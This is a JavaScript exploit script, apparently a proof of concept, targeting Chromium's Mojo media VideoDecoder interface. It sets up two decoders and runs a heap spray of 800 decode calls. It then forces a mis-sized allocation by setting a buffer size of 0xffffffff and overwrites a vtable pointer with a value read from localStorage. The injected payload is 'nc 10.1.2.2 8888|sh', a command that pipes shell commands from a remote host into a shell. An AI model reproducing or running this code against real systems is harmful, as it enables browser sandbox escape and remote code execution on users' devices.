function print(...args) {
    console.log.apply(null, args)
    this.document.write.apply(document, args);
    this.document.write("<br>");
}
this.global = this;
this.interfaceFactory = new media.mojom.InterfaceFactoryPtr();
print("interfaceFactory is created")
Mojo.bindInterface(media.mojom.InterfaceFactory.name,
    mojo.makeRequest(interfaceFactory).handle);

    global.decoderBuffer = [];
        print("create decoder")
        function createVideoDecoderClient() {
            var videoDecoderClientPtrInfo = new mojo.AssociatedInterfacePtrInfo();
            var videoDecoderClientRequest = mojo.makeRequest(videoDecoderClientPtrInfo);
            function VideoDecoderClientImpl() {
                this.binding = new mojo.AssociatedBinding(media.mojom.VideoDecoderClient, this, videoDecoderClientRequest);
                function log() { console.log("message received") };
                this.OnVideoFrameDecoded = log;
                this.OnWaiting = log;
                this.RequestOverlayInfo = log;
            }
            this.videoDecoderClientImpl = new VideoDecoderClientImpl();
            var videoDecoderClient = new media.mojom.VideoDecoderClientAssociatedPtr(videoDecoderClientPtrInfo);
            return videoDecoderClientPtrInfo;
            //return videoDecoderClient;
        }
        function createMediaLog() {
            var mediaLogPtrInfo = new mojo.AssociatedInterfacePtrInfo();
            var mediaLogRequest = mojo.makeRequest(mediaLogPtrInfo);
            function MediaLogImpl() {
                this.binding = new mojo.AssociatedBinding(media.mojom.MediaLog, this, mediaLogRequest);
                function log() { console.log("message received") };
                this.AddEvent = log;
            }
            this.mediaLogImpl = new MediaLogImpl();
            var mediaLog = new media.mojom.MediaLogAssociatedPtr(mediaLogPtrInfo);
            return mediaLogPtrInfo;
            //return mediaLog;
        }

        var videoFrameHandleReleaserPtr = new media.mojom.VideoFrameHandleReleaserPtr;
        var colorSpace = new gfx.mojom.ColorSpace({
            customPrimaryMatrix: [0, 0, 0, 0, 0, 0, 0, 0, 0],
            customTransferParams: [0, 0, 0, 0, 0, 0, 0]
        })

        global.decoderBuffer[0] = Mojo.createDataPipe({ elementNumBytes: 1, capacityNumBytes: 0x10000});
        global.decoderBuffer[1] = Mojo.createDataPipe({ elementNumBytes: 1, capacityNumBytes: 0x8000 });
        var decoder = new media.mojom.VideoDecoderPtr;
        interfaceFactory.createVideoDecoder(mojo.makeRequest(decoder));
        decoder.construct(createVideoDecoderClient(),
            createMediaLog(),
            mojo.makeRequest(videoFrameHandleReleaserPtr),
            decoderBuffer[0].consumer,
            new media.mojom.CommandBufferId({ channelToken: new mojoBase.mojom.UnguessableToken({ high: 80, low: 80 }), routeId: 80 }),
            0,//implementation
            colorSpace
        );
        
        var decoder2 = new media.mojom.VideoDecoderPtr;
        interfaceFactory.createVideoDecoder(mojo.makeRequest(decoder2));
        decoder2.construct(createVideoDecoderClient(),
        createMediaLog(),
        mojo.makeRequest(videoFrameHandleReleaserPtr),
        decoderBuffer[1].consumer,
        new media.mojom.CommandBufferId({ channelToken: new mojoBase.mojom.UnguessableToken({ high: 80, low: 80 }), routeId: 80 }),
        0,//implementation
        colorSpace
        );
 
        mojoDecoderBuffer = new media.mojom.DecoderBuffer({
            timestamp: new mojoBase.mojom.TimeDelta,
            duration: new mojoBase.mojom.TimeDelta,
            frontDiscard: new mojoBase.mojom.TimeDelta,
            backDiscard: new mojoBase.mojom.TimeDelta,
            sideData: [],
            //media_type_converters.cc 转换
            dataSize: 0
        });
        print("decoder is ", decoder);

        var systempoint=localStorage.getItem("systempoint");
        systempoint = parseInt(systempoint);
        document.write(systempoint.toString(16));

        var sprayNumber = 800;
        mojoDecoderBuffer.dataSize=64;

        decoder.decode(mojoDecoderBuffer);
        for(var i=0;i<sprayNumber;i++){
            mojoDecoderBuffer.dataSize=0;//实际分配64，用于heapspray,占掉一些碎片化严重的内存
            decoder.decode(mojoDecoderBuffer);
        }

        //触发分配错误大小内存
        mojoDecoderBuffer.dataSize=0xffffffff;
        var ua = new Uint32Array(0xc0 / 4);
        constructBuffer(ua);
        decoder2.decode(mojoDecoderBuffer);  
        decoderBuffer[1].producer.writeData(ua);    

        setTimeout(() => {
            decoder2.reset();
            decoder.reset();
            decoderBuffer[0].consumer.close();
            decoderBuffer[1].consumer.close();
            decoderBuffer[0].producer.close();
            decoderBuffer[0].producer.close();

        }, 1000);
        
function fixCommand(u8){
print("before fix " +String.fromCharCode.apply(null,u8));
for(var i=0;i<4;i++){
    if(u8[i]===")".charCodeAt(0)||u8[i]===0){
        print("bad character");
        throw "bad";
    }
    if(u8[i]==="(".charCodeAt(0))
        u8[6+3-i]=")".charCodeAt(0);
    else
        u8[6+3-i]=u8[i];//倒序
}

print("after fix " +String.fromCharCode.apply(null,u8));
}

function constructBuffer(ua){

    ua[0x80/4]=(systempoint-4)>>>0;
    print("vtable point to "+ua[0x80/4].toString(16));
    var command = 'a_abcd_;sh -c "log -t e m;nc 10.1.2.2 8888|sh"';
    var copy = new Uint8Array(ua.buffer, 0x84);
    for (var i = 0; i < command.length; i++)
        copy[i] = command.charCodeAt(i);
    var u8 = new Uint8Array(ua.buffer,0x80);
    fixCommand(u8);
}